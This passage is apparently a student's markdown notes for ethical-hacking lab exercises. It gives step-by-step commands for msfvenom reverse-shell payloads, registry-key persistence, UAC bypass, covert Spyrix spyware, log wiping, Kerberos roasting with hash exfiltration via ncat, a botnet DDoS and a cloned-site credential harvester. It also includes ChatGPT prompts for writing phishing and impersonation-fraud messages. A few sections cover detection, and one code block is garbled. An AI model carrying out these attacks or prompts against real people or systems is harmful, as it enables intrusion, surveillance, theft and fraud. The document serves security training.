  - Martin is a user account without any admin privileges, lock the system and from the lock screen press Shift key 5 times
  - this will open a command prompt on the lock screen
  - whoami 
  - We can see that we have successfully got a persistent System level access to the target system by exploiting sticky keys
</details>

<details>
<summary>Maintain Remote Access and Hide Malicious Activities</summary>

* User System Monitoring and Surveillance using Spyrix :~
  - Spyrix is a commercial spyware/keylogger that is often marketed as “parental control” software, but in reality it works like a surveillance tool
  - open host machine and lanch spyrix and register in the website of the spyrix
  - give your gmail and login to spyrix
  - find remote desktop connection to connect target system connection using target system ip address and username
  - remote desktop connection
  - <target_ip>
  - <target_username>
  - minimize remote desktop connection in target machine and copy spyrix from host machine to target machine
  - open spyrix in target machine
  - enter same gmail which gmail you are login in host machine
  - clear the process and delete that spyrix and close the target remote connection
  - in host machine maximize the spyrix web and the new device connected pop-up appears
  - now u will connect and servellence or get all data of the target machine
  - you will create your report also

* Maintain Persistence by Modifying Registry Run Keys :~
  - parrot terminal
  - sudo su and cd for root terminal
  - create a payload as Test.exe 
    ```console
        msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe
    ```
  - create a payload as registry.exe
    ```console
        msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
    ```
  - to create, give full owner access to share directory in /var/www/html/ 
    ```console
        mkdir /var/www/html/share
        chmod -R 755 /var/www/html/share/
        chown -R www-data:www-data /var/www/html/share
    ```    
  - Copy the both payloads into the shared folder
    ```console
        cp /home/attacker/Desktop/Test.exe /var/www/html/share/
        cp /home/attacker/Desktop/registry.exe /var/www/html/share/
    ```
  - service apache2 start 
  - msfconsole 
  - use exploit/multi/handler
  - set payload windows/meterpreter/reverse_tcp
  - set lhost <host_ip>
  - set lport <host_port>
  - run
  - open target machine
  - open web browser and type http://<host_ip>/directory_name
  - download both payloads in target machine
  - double click test.exe
  - The meterpreter session has successful
  - getuid 
  - background

  - in metasploit using silentcleanup module 
    ```console
        use exploit/windows/local/bypassuac_silentcleanup
        set LHOST <host_ip>
        set target 0 
        exploit  
    ```
  - The BypassUAC exploit has successfully bypassed the UAC setting
  - getsystem -t 1 
  - getuid 
  - open the shell in their using command shell
    ```console
        reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
    ```
  - open another terminal window
    - msfconsole
    - use exploit/multi/handler
    - set payload windows/meterpreter/reverse_tcp
    - set lhost <host_ip>
    - set lport <host_port> 
    - exploit
  - go to the target machine and restart the machine
  - switch to the Parrot Security machine and you can see that the meterpreter session is opened.
  - getuid 
  - attacker can maintain persistence on the target machine using Run Registry keys                               
</details>

<details>
<summary>Clear Logs to Hide the Evidence of Compromise</summary>

* Clear Windows Machine Logs using Various Utilities :~
  - There are various Windows utilities that can be used to clear system logs such as 
    - Clear_Event_Viewer_Logs.bat
    - wevtutil
    - Cipher
  - Clear_Event_Viewer_Logs.bat:  
    - go to the target machine and run Clear_Event_Viewer_Logs.bat(Run as administrator)
    -  Command Prompt window appears, and the utility starts clearing the event logs
    - Clear_Event_Viewer_Logs.bat is a utility that can be used to wipe out the logs of the target system

  - wevtutil:
    - Command Prompt(Run as administrator)
    - wevtutil el = command to display a list of event logs
    - wevtutil cl System = command for clear all log in system
    - wevtutil is a command-line utility used to retrieve information about event logs and publishers

  - cipher:
    - Command Prompt
    - cipher /w:[Drive or Folder or File Location]
    - The Cipher.exe utility starts overwriting the deleted files, first, with all zeroes (0x00); second, with all 255s (0xFF)
    - Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery

* Clear Linux Machine Logs using the BASH Shell :~
  - switch to the Parrot Security machine
  - export HISTSIZE=0 (command to disable the BASH shell from saving the history)  
  - history -c (command to clear the stored history)
  - history -w (command to delete the history of the current shell)
  - shred ~/.bash_history (command to shred the history file, making its content unreadable)
  - more ~/.bash_history (command to view the shredded history content)
  - ctrl+z (to stop viewing the shredded history content)
  - shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit (This command first shreds the history file, then deletes it, and finally clears the evidence of using this command)
</details>

<details>
<summary>Perform Active Directory (AD) Attacks Using Various Tools</summary>

* Perform Initial Scans to Obtain Domain Controller IP and Domain Name :~
  - Terminal 
  - sudo su 
  - cd command to jump to the root directory
  - nmap 10.10.1.0/24 (command to scan the entire subnet and identify the DC IP address)
  - nmap shows that host 10.10.1.22 has port 88/TCP kerberos-sec and port 389/TCP LDAP opened which confirms that our DC IP address is 10.10.1.22
  - nmap -A -sC -sV 10.10.1.22 
  - we get the domain name which is CEH.com

* Perform AS-REP Roasting Attack :~
  - Terminal 
  - sudo su 
  - cd command to jump to the root directory  
  - cd impacket/examples/ 
  - Python script to retrieve AD user information:
    ```console
        python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22
    ``` 
       - GetNPUsers.py: Python script to retrieve AD user information
       - CEH.com/: Target AD domain
       - -no-pass: Flag to find user accounts not requiring pre-authentication
       - -usersfile ~/ADtools/users.txt: Path to the file with the user account list
       - -dc-ip 10.10.1.22: IP address of the DC to query  
  - We can observe that the user Joshua has DONT_REQUIRE_PREAUTH set. As this user is vulnerable to AS-REP roasting, we obtain Joshua's password hash
  - Copy that hash and save it as joshuahash.txt
  - echo '[HASH]' > joshuahash.txt
  - crack the password hash and will give us the password in plain text
    ```console
         john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
    ```
  - The password for the user Joshua has been cracked - cupcake

* Spray Cracked Password into Network using CrackMapExec :~
  - Terminal 
  - sudo su 
  - cd command to jump to the root directory
  - from the Nmap results we can observe that other hosts in the subnet are running services such as RDP, SSH, and FTP
  - we can perform password spraying on each service individually to check for correct credentials
    ```console
        cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake" (perform password spraying)
    ```    
       - rdp: Targets the Remote Desktop Protocol (RDP) service
       - 10.10.1.0/24: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0
       - -u /root/ADtools/users.txt: Specifies the path to the file containing user accounts for authentication
       - -p "cupcake": Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts 
  - After the spray completion we find that user Mark is using the same password cupcake on host 10.10.1.40
  - elect Remmina and open it and enter IP address 10.10.1.40 to connect (10.10.1.40 is the IP address
  - Enter RDP authentication credentials
  - A Remote Desktop connection will be successfully established
  - Minimize the Remmina window.

* Perform Post-Enumeration using PowerView :~
  - cd /root/ADtools (move into the ADtools folder)
  - we will attempt post-enumeration to gather additional information about the AD
  - For enumeration purposes, we will utilize the PowerView.ps1 script
  -  python3 -m http.server to start the HTTP server
  - return to Remmina where our RDP session is active
  - navigate to the URL http://10.10.1.13:8000/PowerView.ps1 
  - launch PowerShell 
  - Navigate to the Downloads folder by running the command cd Downloads
  - powershell -EP Bypass
  - .\PowerView.ps1
  - Get-NetComputer (command in PowerShell. This command will display all the information related to computers in AD)
  - Get-NetGroup (in PowerShell. The Get-NetGroup command in PowerView lists all groups in AD)
  - Get-NetUser in PowerShell. Get-NetUser in PowerView retrieves detailed information about AD user accounts,such as usernames and group memberships
  - we found a new user SQL_srv
  - PowerView.ps1 for enumeration:
    - Get-NetOU - Lists all organizational units (OUs) in the domain
    - Get-NetSession - Lists active sessions on the domain
    - Get-NetLoggedon - Lists users currently logged on to machines
    - Get-NetProcess - Lists processes running on domain machines
    - Get-NetService - Lists services on domain machines
    - Get-NetDomainTrust - Lists domain trust relationships
    - Get-ObjectACL - Retrieves ACLs for a specified object
    - Find-InterestingDomainAcl - Finds interesting ACLs in the domain
    - Get-NetSPN - Lists service principal names (SPNs) in the domain
    - Invoke-ShareFinder - Finds shared folders in the domain
    - Invoke-UserHunter - Finds where domain admins are logged in
    - Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access on specified machines

* Perform Attack on MSSQL service :~
  - We will attempt to brute force the password using Hydra, as we already know the username, which is SQL_srv
  - Terminal 
  - sudo su  
  - Save the username SQL_srv in a text file and name it as user.txt using command pluma user.txt
  - to brute force the MSSQL service password
    ```console
        hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql                  
    ```
  - We have successfully cracked the password for SQL_srv, which is "batman"
  - we will attempt to log into the service using mssqlclient.py
  - python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433
  - SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
  - we know that xp_cmdshell is enabled on SQL server we can use Metasploit to exploit this service. Type exit
  - open msfconsole
    ```console
        use exploit/windows/mssql/mssql_payload
        set RHOST 10.10.1.30
        et USERNAME SQL_srv
        set PASSWORD batman
        set DATABASE master
        exploit
    ```

* Perform Privilege Escalation :~
  - WinPEASx64.exe = tool for Windows privilege escalation, identifying misconfigurations and vulnerabilities for potential exploitation
  - we will use WinPEAS.exe to enumerate any misconfigurations
  - We will upload the WinPEAS.exe file and execute it in Windows
  - Move to C:\ using the command cd C:\
  - move to C:\Users\Public\Downloads using cd and execute the command powershell
  - we need to host winPEASx64.exe on the attacker machine using Python
  - sudo su
  - cd /root/ADtools
  - python3 -m http.server (host the winPEASx64.exe file)
  - Get back to the shell terminal and type
    ```console
        wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe
    ```
  - ./winpeas.exe
  - Open a new terminal with root privileges using the command sudo su and toor as password
  - msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
  - Get back to our shell terminal and move to C:\Program Files\CEH Services
  - cd ../../.. ; cd "Program Files/CEH Services"
  - move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe
  - nc -nvlp 8888
  - assuming we are the victim now. Restart the machine by hovering over Power and Display button and click Reset/Reboot button present at the toolbar located above the virtual machine and log in with the username SQL_srv and password "batman."
  - we got the shell to our netcat listener
  
* Perform Kerberoasting Attack :~
  - In the netcat shell, execute the powershell command to launch PowerShell
  - cd ../.. ; cd Users\Public\Downloads (Navigate to C:\Users\Public\Downloads)
  - we will be downloading Rubeus and netcat:
    ```console
        wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
    ```
  - Once the tools are downloaded type exit
  - cd ../.. && cd Users\Public\Downloads (move into the Download directory)
  - rubeus.exe kerberoast /outfile:hash.txt
  - After kerberoasting the password hash for DC-Admin is saved in hash.txt file
  - Open a new terminal, type sudo su and press Ente
  - nc -lvp 9999 > hash.txt
  - ncat.exe -w 3 10.10.1.13 9999 < hash.txt
  - Get back to the netcat listener terminal and press Enter to save the file
  - we will be using HashCat to crack the password hash
    ```console
        we will be using HashCat to crack the password hash
    ```
       - -m 13100: This specifies the hash type. 13100 corresponds to Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), a specific format for Kerberos hashes
       - --force: This option forces Hashcat to ignore warnings and run even if there are compatibility issues. Use this with caution, as it might cause instability or incorrect results
       - -a 0: This specifies the attack mode. 0 stands for a straight attack, which is a simple dictionary attack where Hashcat tries each password in the dictionary as it is
       - hash.txt: is the input file containing the hashes to crack
       - /root/ADtools/rockyou.txt: is the wordlist file used for the attack  
  - we get the password advanced!
  - As DC-Admin has high privileges on the domain, we can use this password for further attacks                     
</details>

<details>
<summary>Perform System Hacking using AI</summary>

* Perform System Hacking using ShellGPT :~
  - after activation of the sgpt in the terminal window run 
    ```console
        sgpt --shell "Use msfvenom to create a TCP payload with lhost=10.10.1.13 and lport=444"
    ```
  - run ls command to display a list of files in the directory and you can observe a file named as payload.exe has been created
  - initialize listener on the given LHOST and LPORT
    ```console
        sgpt --shell "Use msfconsole to start a listener with lhost=10.10.1.13 and lport=444"
    ```    
  - Msfconsole successfully initializes the listener
  - As we are not executing payload in the victim's machine, you will not be able to establish any session
  - exit command to exit msfconsole
  - to perform SSH-bruteforce attack on the target machine:
    ```console
        sgpt --shell "Use Hydra to perform SSH-bruteforce on IP address=10.10.1.9 using username.txt and password.txt files available at location /home/attacker/Wordlist"
    ```
  - Using the provided wordlist files, Hydra cracks SSH username and password of the target machine
  - demonstrate image stegnography. (here, cover.jpg file is located at /home/attacker):
    ```console
        sgpt --shell "Perform stegnography using steghide to hide text 'My swiss account number is 232343435211113' in cover.jpg image file with password as '1234'"
    ```
  - The given text is embedded to cover.jpg file
  - navigate to /home/attacker and double-click cover.jpg file to view the image file
  - Navigate back to the Terminal window
  - we will extract hidden text from the cover.jpg file by executing:
    ```console
        sgpt --shell "Use steghide to extract hidden text in cover.jpg"
    ```
  - Enter passphrase prompt, type 1234 and press Enter
  - next prompt, type y and press Enter
  - extracted data is stored in the secret.txt file
  - run pluma secret.txt command to view the extracted data file          
</details>

# Malware Threats
<details>
<summary>Gain Access to the Target System using Trojans</summary>

* Gain Control over a Victim Machine using the njRAT RAT Trojan :~
  - we are using njRAT(njRAT v0.8d.exe) for exploit the target mechine using trojan
  - njRAT GUI appears; click the [Build] button located in the lower-left corner of the GUI to configure the exploit details
  - Host field, check the options Randomize Stub, USB Spread Nj8d, Protect Prosess [BSOD], leave the other settings to default, and click Build
  - we share that .exe file to victim mechine and execute that file and we can get that access 
</details>

<details>
<summary>Infect the Target System using a Virus</summary>

* Create a Virus using the JPS Virus Maker Tool and Infect the Target System :~
  - Tool : JPS virus maker(ethical hacker and pemetration tester uses ths tool)
  - we creating the virus file in attaker system and send that system to victim mechine 
  - when the victim execute that file victim is attacked by the virus
  - it will desable all the features what attacker select
  - attacker change the system password also
</details>

<details>
<summary>Perform Static Malware Analysis</summary>

* Perform Malware Scanning using Hybrid Analysis :~
  - tool = hybrid analysis
    ```console
         https://www.hybrid-analysis.com
    ```  
  - we are using the hybrid analysis for scanning the malicious file 
  - open the hyberid analysis and drag and drop the malicious file
  - ofter analysis it will give all the report about malicious file
  - other local and online malware scanning tools:
    - Any.Run:
      ```console
           https://app.any.run
      ```
    - Valkyrie Sandbox:
      ```console
           https://valkyrie.comodo.com 
      ```
    - JOESandbox Cloud:
      ```console
           https://www.joesandbox.com  
      ```
    - Jotti:
      ```console
           https://virusscan.jotti.org 
      ```  

* Analyze ELF Executable File using Detect It Easy (DIE) :~
  - ELF = Executable and linkable formate
  - DIE = Detect It Easy(its a tool)
  - we are using DIE tool to know about malware and its structure and want to know more about this
  - to identify packing/obfuscation methods
  - DIE is give all the information about malware
  - open the DIE tool and insert the file or text file and it will give all info about the malware
  - use other packaging/obfuscation tools:
    - Macro_Pack:
      ```console
           https://github.com
      ```
    - UPX:
      ```console
           https://upx.github.io 
      ```
    - ASPack:
      ```console
           http://www.aspack.com  
      ```
    - JVMprotect:
      ```console
           https://vmpsoft.com 
      ```

* Perform Malware Disassembly using IDA and OllyDbg :~
  - tools:
    - iDA = interactive disassembler
    - OllyDbg = its a debugger
    - we are using these two tools for perform malware disassmbly using IDA and ollydbg to reveal the hidden instructions and behaviours of malware understand how it works internally and creste accurate detection and defense stratargies
    - we open the IDA tool for deasseble the malicious file into human readable formate
    - we will check flowchat is inside the grap and we will see the function call and we will see the call flow(WinGraph32 Call flow)
    
    - we will open the ollydbg and insert the file and cpu main thread page appears 
    - check log
    - check executable module
    - check memory cap
    - check thread 
</details>

<details>
<summary>Perform Dynamic Malware Analysis</summary>

* Perform Port Monitoring using TCPView and CurrPorts :~
  - tools:
    - TCPView = this shows all TCP ports process in our system 
    - currports = this shows all ports process in our system
  - open TCPview it will show you all the process in port under tcp
  - if you dont want any process you can kill the process

  - open currports and it will show all the port rummimg im the system it you want any port you can kill that process 
  - one thing is once you kill any process attacker never connect back to that system  
  - other port monitoring tools:
    - TCP Port/Telnet Monitoring:
      ```console
           https://www.dotcom-monitor.com
      ```
    - PRTG Network Monitor:
      ```console
           https://www.paessler.com
      ```
    - SolarWinds Open Port Scanner:
      ```console
           https://www.solarwinds.com  
      ```

* Perform Process Monitoring using Process Monitor :~
  - tool:
    - processmonitor = show all the processes running in your system
  - open processmonitor and it show all the processes running in your system 
  - we can get all the details about any process
  - other process monitoring tools:
    - Process Explorer:
      ```console
           https://docs.microsoft.com
      ```
    - OpManager:
      ```console
           https://www.manageengine.com
      ```
    - Monit:
      ```console
           https://mmonit.com  
      ``` 
    - ESET SysInspector:
      ```console
           https://www.eset.com  
      ```    
    - System Explorer:
      ```console
           https://systemexplorer.net 
      ```                        
</details>

# Sniffing
<details>
<summary>Perform Active Sniffing</summary>

* Perform MAC Flooding using macof :~
  - launch Parrot Security machine
  - open wireshark and select the interface(eth0)
  - open terminal and sudo su and cd for root directory
  - using macof comand:
    ```console
         macof -i eth0 -n 10
         //if you are doing mac flooding for one targeted system also use this 
         macof -i eth0 -d <target ip>
    ```
      - -i = interface
      - -n = number of packets
      - -d = destination ip
  - This command will start flooding the CAM table with random MAC addresses
  - Wireshark window and observe the IPv4 packets from random IP addresses
  - captured IPv4 packet and expand the Ethernet II node in the packet details section
  - Macof sends the packets with random MAC and IP addresses to all active machines in the local network
  - close all the tabs

* Perform a DHCP Starvation Attack using Yersinia :~
  - in Parrot Security machine, launch Wireshark and start packet capturing on available ethernet or interface
  - Open a Terminal window and execute sudo su to run the programs as a root user and cd for root directory
  - Run yersinia -I to open Yersinia
    - -I = Starts an interactive session
  - command:
    - yersinia -I 
    - h = help for command
    - F2 = select DHCP mod
    - y = exit
    - x = list all the attacks available
  - select the option which you want i will press option 1
  - Yersinia starts sending DHCP packets to the network interface
  - press quit for q
  - switch to the Wireshark window and observe the huge number of captured DHCP packets
  - Click on any DHCP packet and expand the Ethernet II node 
  - close all tabs   
</details>

<details>
<summary>Perform Network Sniffing using Various Sniffing Tools</summary>

* Perform Password Sniffing using Wireshark :~
  - Windows Server 2019 machine and login
  - lunch the wireshark
  - back to the windows 11 and open we browser and open website and login 
    ```console
         http://www.moviescope.com/
    ```
  - login this website and come back to the windows server 2019
  - open wireshark in the wireshark save the captured packets as password sniffing
  - filter (Wireshark only filters http POST traffic packets):
    ```console
         http.request.method == POST
    ```   
  - navigate to Edit --> Find Packet 
  - Find Packet section appears
    - Display filter --> String  
    - Narrow & Wide --> Narrow (UTF-8 / ASCII)   
    - Packet list --> Packet details  
  - In the field next to String, type pwd and click the Find
  - Wireshark will now display the sniffed password from the captured packets
  - Close the Wireshark window

  - switch to the Windows 11 machine, close the web browser, and sign out from the Admin account
  - switch back to the Windows Server 2019
  - open remote desktop option and connect to the windows 11 Jason user in the ip of the 10.10.1.11
  - remote connection is appears
  - opem the contro pannel
    - system and security --> windows tools --> services --> remote packet capture protocal v.0(experimental) --> start
  - status is showing as the running
  - close all tabs including remote desktop connection also
  - in Windows Server 2019, launch Wireshark and click on Capture options:
    - Manage Interfaces --> Remote Interfaces --> Add a remote host and its interface(+) --> create using user ip and port 
  - select created interface and start the wireshark
  - open windows 11 using Jason user
  - open browser and browse anything and what you brows in Jason account it will capture in the windowss server 2019 wireshark
  - close all the tab             
</details>

<details>
<summary>Detect Network Sniffing</summary>

* Detect ARP Poisoning and Promiscuous Mode in a Switch-Based Network :~
  - switch to the Windows Server 2019 machine
  - In the Desktop window open the cain tool 
  - click Configure from the menu bar to configure an ethernet card
  - The Sniffer tab is selected by default. Ensure that the Adapter associated with the IP address and then click ok
  - Click the Start/Stop Sniffer icon and click the Sniffer tab
  - Click the plus (+) icon or right-click in the window and select Scan MAC Addresses to scan the network for hosts
  - The MAC Address Scanner window appears. Check the All hosts in my subnet radio button. Select the All Tests checkbox and then ok
  - Cain & Abel starts scanning for MAC addresses and lists all those found
  - a list of all active IP addresses along with their corresponding MAC addresses is displayed
  - click the APR tab at the bottom
  - Click the plus (+) icon; a New ARP Poison Routing window appears
  - To monitor the traffic between two systems (here, Windows 11 and Parrot Security), from the left-hand pane, click to select 10.10.1.11 (Windows 11) and from the right-hand pane, click 10.10.1.13 (Parrot Security); click OK
  - Click on the Start/Stop APR
  - fter clicking on the Start/Stop APR icon, Cain & Abel starts ARP poisoning and the status of the scan changes to Poisoning
  - you need to ping one target machine using the other
  - switch to the Parrot Security machine and run sudo su and cd for root directory
  - run :
    ```console
         hping3 [Target IP Address] -c 100000
    ```
  - switch to the Windows Server 2019 machine and open the wireshark
    - wireshark --> edit --> preferences --> protocal --> ARP/RARP --> Detect ARP request storms 
  - click ok
  - and select the interface ethernet 2and ender its start capturing 
  - stop the capturing 
  - go to the analyse and expert information  and we can see all the packet information over there
  - close the wireshark and open the ubantu
  - open terminal and sudo su for root user
  - we check promiscous mode is on or off
  - run the nmap script:
    ```console
         nmap --script=sniffer-detect <Target IP Address>
    ```
  - The scan results appear, displaying Likely in promiscuous mode under the Host script results section. This indicates that the target system is in promiscuous mode
  - close all tabs           
</details>

# Social Engineering
<details>
<summary>Perform Social Engineering using Various Techniques</summary>

* Sniff Credentials using the Social-Engineer Toolkit (SET) :~
  - tool = Social Engineering tool(SET)
  - Parrot Security machine. Login using attacker/toor
  - Run setoolkit to launch Social-Engineer Toolkit
  - The SET menu appears
    - Social-Engineering Attacks --> Website Attack Vectors --> Credential Harvester Attack Method --> Site Cloner  
    - IP address for the POST back in Harvester/Tabnabbing = <local mechine ip address>
    - Enter the url to clone = http://www.moviescope.com
    - press enter cloning will starts
  - After cloning is completed, a highlighted message appears. The credential harvester initiates
  - open the firefox and open the mail and send one phishing mail to the targeted user or anyone yo want to send
  - send email with cloned(melicious) website link inside the mail
  - go to the target mechine and open the target user mail and click the malicious link it will redirect to the moviescope website login page
  - when user enter the login credentials on that login page those credentials are sniff and show in the attacker host mechine in plain text
  - sniff the credential ia done 
  - close all tabs   
</details>

<details>
<summary>Detect a Phishing Attack</summary>

* Detect Phishing using Netcraft :~
  - open the netcraft: 
    ```console
         https://www.netcraft.com/apps-extensions
    ```
  - click LEARN MORE button under Browser Protection 
  - Download the extension today and click on Firefox logo(which browser you that)
  - add the extension for firefox browser
  - after the adding open any geniune website or link it will open 
  - open any phishing sites it will not open netcraft will block tha browser
  - this is the detection of the phishing sites        
</details>

<details>
<summary>Social Engineering using AI</summary>

* Craft Phishing Emails with ChatGPT :~
  - open chatgpt
    ```console
         chatgpt.com
    ```
  - ChatGPT main page appears. In the chat field, type
    ```console
         I am Microsoft's customer support executive, write a concise mail stating that he/she has found suspicious login on user's account and ask then to reset the password on urgent basis. Provide the reset link at [Reset Link]
    ```
  - press enter The ChatGPT crafts a phishing mail as per the given prompt
  - Similarly, you can use prompts like
    ```console
         Write an email from a company's IT administrator its employees letting them know that they need to install the latest security software. Provide a link where the employee can download the software. Let them know that all employees must complete the download by next Friday
    ```
  - ChatGPT provides also provides a functionality of regenerating the response, you can do so by clicking on Regenerate icon
  - we will craft an email by impersonating a person on the basis of his writing style. To do so, in the chat field, type
    ```console
         Impersonate the Sam's writing style from the conversations given below and create a message for John saying that his father got massive heart attack today and he is in need of money so urging john for transferring the required amount of money to his account on urgent basis. Here is the previous conversations between Sam and John on various topics Topic: Nature and Its Beauty John: Hey Sam, have you ever marveled at the beauty of nature? The way the sun paints the sky during sunset is just breathtaking, isn't it? Sam: The celestial orb's descent into the horizon provides a resplendent spectacle, casting an ethereal kaleidoscope of hues upon the atmospheric canvas. Nature's grandeur unveils itself in the cosmic ballet of light and shadow. John: Yeah, I guess so. I just love how the colors change, you know? It's like a painting in the sky. Sam: The chromatic metamorphosis, a transient masterpiece, orchestrates a symphony of spectral transitions, manifesting the ephemeral artistry inherent in the terrestrial firmament
    ```
  - Apart from the aforementioned prompts, you can further use other prompts to craft a phishing mail and send to the victims in order to perform social engineering attacks
  - This concludes the demonstration of crafting phishing mails using ChatGPT              
</details>

# Denial-of-Service
<details>
<summary>Perform DoS and DDoS Attacks using Various Techniques</summary>

* Perform a DDoS Attack using ISB and UltraDDOS-v2 :~
  - tools: 
    - ISB(i am so bored)
    - UltraDDOS-v2
  - open window 11 and download ISB(im so bored)
  - sing this tool we can perform various attacks such as HTTP Flood, UDP Flood, TCP Flood, TCP Port Scan, ICMP Flood, and Slowloris
  - we will perform TCP Flood attack on the target Windows Server 2019 machine
  - open the ISB tools :
    - URL = <target_ip>
    - port = <default 80 (our choice)>
    - click = set target
  - under attack go to the TCP flood:
    - interval = 10
    - buffer = 256
    - threads = 1000
  - Leave the ISB window running and click and open the windows server 2022
  - download the ultraddos.exe
  - In the Ultra DDOS v2 window, click on DDOS Attack button
  - Please enter your target. This is the website or IP address that you want to attack = <target_ip>
  - Please enter a port. 80 is most commonly used, but you can use any other valid port = 80 
  - Please enter the number of packets you would like to send. More is better, but too many will crash your computer = 1000000
  - Please enter the number of threads you would like to send. This can be the same number as the packets = 1000000
  - The attack will start once you press OK. It will keep going until all requested packets are sent
  - As soon as you click on OK the tool starts DoS attack on the Windows Server 2019
  - witch to the Windows 11 machine, and in the ISB window click on Start Attack button
  - switch to the Windows Server 2019 machine
  -  search for resmon in the search bar and CPU utilization under CPU section is more than 80%

* Perform a DDoS Attack using Botnet :~
  - switch to the Parrot Security machine. Open a Terminal window and execute sudo su to run the programs as a root user
  - Run the command for creating payload for system 1(windws 11):
    ```console
         msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe > exploit1.exe
    ```
  - Run the command for creating payload for system 2(windows server 2019):
    ```console
          msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=9999 -f exe > exploit2.exe 
    ```    
  - Run the command for creating payload for system 3(windows server 2022):
    ```console
          msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=5555 -f exe > exploit3.exe 
    ``` 
  - Create a new directory to share the exploits file: 
    ```console
         mkdir /var/www/html/share
    ```
  - provide the permissions:
    ```console
         chmod -R 755 /var/www/html/share/
    ```
    ```console
         chown -R www-data:www-data /var/www/html/share/
    ```
  - Copy the payloads into the shared folder:
    ```console
         cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/
    ```
  - Start the Apache server = service apache2 start
  - Launch three new terminals and run command sudo su
  - launch metasploit framework for create the handler or listener for those three payloads:
    - for system 1(windows 11):
      ```console
           msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
      ```
    - for system 2(windows server 2019):
      ```console
           msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 9999; run" 
      ```
    - for system 3(windows server 2022):
      ```console
           msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 5555; run"  
      ```
  - switch to the Windows 11 machine and go to = http://10.10.1.13/share  
  - download the exploit1.exe for this system and execute that file
  - do the same thing with system 2 and system 3 also
  - go back to the host mechine parrot and the meterpreter session has successfully been opened
  - Now, we will upload the DDoS script to our botnets
  - in windows shell terminal:
    ```console
         upload /home/attacker/Downloads/eagle-dos.py
    ```
  - run shell
    - run the DDoS file using command python eagle-dos.py 
    - target ip address(for ex 10.10.1.9)  
  - Make sure you run script on all 3 shell terminals
  - open target system and opne terminal with sudo wireshark
  - Wait for 5-6 minutes, then click on Show Applications and search for and launch System Monitor
  - in memory usage is 98.7% and which slows down Ubuntu machine and also makes it unresponsive                                                                      
</details>

<details>
<summary>Detect and Protect Against DoS and DDoS Attacks</summary>

* Detect and Protect Against DDoS Attacks using Anti DDoS Guardian :~
  - open windows 11 and download Anti_DDoS_Guardian_setup.exe
  - Setup - Anti DDoS Guardian window appears; click Next
  - uncheck the install Stop RDP Brute Force option and click next
  - install the that tool
  - Completing the Anti DDoS Guardian Setup Wizard window appears; ensure that Launch Anti DDoS Guardian option is selected and click Finish
  - switch to the Windows Server 2019 and download Low Orbit Ion Cannon (LOIC)
  - inside the LOIC:
    - Select your target IP = <target_IP>
    - click = Lock on 
  - Under the Attack options:
    - method = UDP
    - Threads = 5
    - Slide the power bar to the middle
  - switch to the Windows Server 2022 machine and follow the smae step of LOIC
  - click the IMMA CHARGIN MAH LAZER button under the Ready? section to initiate the DDoS attack on the target
  - witch back to the Windows 11 machine and observe the packets captured by Anti DDoS Guardian
  - Observe the huge number of packets coming from the host machines (10.10.1.19 [Windows Server 2019] and 10.10.1.22 [Windows Server 2022]
  - Double-click any of the sessions 10.10.1.19 or 10.10.1.22
  - Anti DDoS Guardian Traffic Detail Viewer window appears, displaying the content of the selected session in the form of raw data 
  - you can observe the high number of incoming bytes from Remote IP address 10.10.1.22
  - You can use various options from the left-hand pane such as Clear, Stop Listing, Block IP, and Allow IP
  - Observe that the blocked IP session turns red in the Action Taken column  
</details>

# Session Hijacking
<details>
<summary>Perform Session Hijacking</summary>

* Hijack a Session using Caido :~
  - open windows 11
  - open cmd as a administrator
  - type command ipconfig/flushdns
  - search caido and edit the menu biside the start button and edit it
  - Edit Instance window, click on the radio button besides All interfaces (0.0.0.0) to listen on all the available network interfaces and click on Save
  - login to the caido account and open the caido account
  - Once logged in, Register your Caido Instance pop-up will appear. Type Session Hijacking and click Register
  - Click on + Create a project button to create a new project. Create a project pop-up appears, name it as Session Hijacking
  - Click on Intercept option
  - Click the Forwarding icon and wait until it changes to Queuing
  - go to the windows server 2019
  - Open Firefox web browser and navigate to http://10.10.1.11:8080/ca.crt. CA certificate will be downloaded 
  - open the settings of the firefox and add the certification and add proxy ip of attackrs
  - Set HTTP Proxy to 10.10.1.11 and port to 8080
  - Open a new tab in Firefox web browser and place your mouse cursor in the address bar, type www.moviescope.com
  - go back to the window 11 and open the caido 
  - on the request tab 
  - www.goodshopping.com in all the captured GET requests and Forward all the requests
  - modify every GET request of www.moviescope.com to www.goodshopping.com
  - now go back to the 2019 machine you will see the website is redirect to the www.goodshopping.com

